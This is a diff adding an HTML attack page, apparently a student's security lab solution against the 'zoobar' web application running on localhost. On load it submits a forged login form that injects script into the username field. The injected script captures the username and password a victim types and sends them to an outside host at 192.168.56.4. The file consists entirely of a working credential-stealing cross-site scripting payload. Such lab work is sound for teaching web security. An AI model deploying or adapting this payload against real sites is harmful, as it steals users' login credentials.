@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script>
+            function hack() {
+                document.getElementsByName("login_username")[0].value = '"></td> <script> var hasSent = false;  document.getElementsByName("login_username")[0].value = "";   document.getElementsByName("login_username")[0].addEventListener("focus", init, false);   function init()  {   document.getElementsByName("submit_login")[0].addEventListener("click", send, false);  }   function send(e)   { str="http://192.168.56.4:12345/?payload="\+ document.getElementsByName("login_username")[0].value \+ "%3B" \+ document.getElementsByName("login_password")[0].value \+"&roll=15111038"\+ "&random=" \+ Math.floor(Math.random()*100);  var xhr = new XMLHttpRequest();     xhr.open("GET",str,true);  xhr.send();                }       <\/script>   <td style="display:none';
+                document.getElementsByName("fakeloginform")[0].submit();
+                }
+            </script>
+        </head>
+        <body onload="hack();">
+            <form method="POST" name="fakeloginform" action="http://localhost:8080/zoobar/index.cgi/login">
+                <input name="login_username" type="text" value="" >
+            </form>
+        </body>
+    </html>
